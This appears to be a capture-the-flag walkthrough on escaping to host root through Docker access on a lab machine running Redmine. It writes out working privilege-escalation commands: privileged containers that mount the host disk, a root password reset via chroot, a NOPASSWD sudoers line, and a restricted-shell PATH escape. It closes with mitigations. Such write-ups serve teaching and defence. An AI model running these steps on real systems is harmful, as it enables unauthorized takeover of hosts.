#### docker
I reviewed the security implications of access to the Docker daemon.
```bash
docker run --rm -it --privileged -u root alpine \
mount /dev/sda1 /mnt/ \
ls -la /mnt/ \
chroot /mnt /bin/bash
```
The daemon could not retrieve remote images, so I reviewed those already present.
```bash
docker images
# redmine         latest       0c8429c66e07        6 years ago         542MB
# postgres        latest       adf2b126dda8        6 years ago         313MB
```
The host had local Redmine and PostgreSQL images.
```bash
docker run -v /:/mnt --rm -it -u root --entrypoint /bin/sh postgres
# Host filesystem bind mount
# Container process identity
# Container entry point selection
```
The container had sufficient access to modify host account data.
```bash
# Host filesystem write exposure
chroot /mnt passwd root
# A changed process root alters where absolute filesystem paths resolve
# A writable bind mount exposes the underlying host files to processes with sufficient access
# The rootful Docker daemon managed the container and its mounts
# The write affected host authentication data, not merely the container's account files

# Exit the container
exit
# The temporary container is removed on exit
```
The changed host credential provided root access after the container exited.

The same host write exposure could affect sudo policy and account privileges.
```bash
# Impact on local sudo policy
echo "eleanor ALL=(ALL) NOPASSWD: ALL" >> /mnt/etc/sudoers
```

Trust boundary analysis
Why did selecting the container's root identity require no root password?
Docker selected the process identity at launch. It did not perform a password login inside the container.

Why could the container's root process modify the host account database?
The Docker daemon ran with root privileges on the host.
The daemon trusted the caller to request mounts of host files and launch containers. That authority exposed host filesystem writes.


Mitigations for excessive Docker access
1. Consider rootless Docker to reduce the privileges held by the daemon and its containers.
2. Use user namespace remapping so container UID 0 maps to an unprivileged host UID.
3. Restrict Docker group membership to trusted administrators.


#### Recap
The scan exposed Redmine and a service banner that identified Eleanor. A weak SSH password provided initial access, but the account started in a restricted shell.
```txt
chmod  chown  ed     ls     mv     ping   sleep  touch
```
A text editor available in the restricted shell could read the local flag.


I investigated the restricted shell and found that its effective command search path could change.
```bash
export PATH=/bin:/usr/bin:$PATH
```
The environment change restored access to standard commands.
Redmine and PostgreSQL were running in containers. A PwnKit test was blocked at the transfer stage, so I reviewed the account's access to Docker.
```bash
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```
The daemon could not pull an image remotely, but existing local images were available. The combination of a rootful daemon and host filesystem mounts exposed host account data.
```bash
docker run -v /:/mnt --rm -it -u root --entrypoint /bin/sh postgres
```

The writable host filesystem allowed changes to the root account's credential from the container context.
```bash
chroot /mnt passwd root

exit
```
The changed credential provided host root access and the second flag.
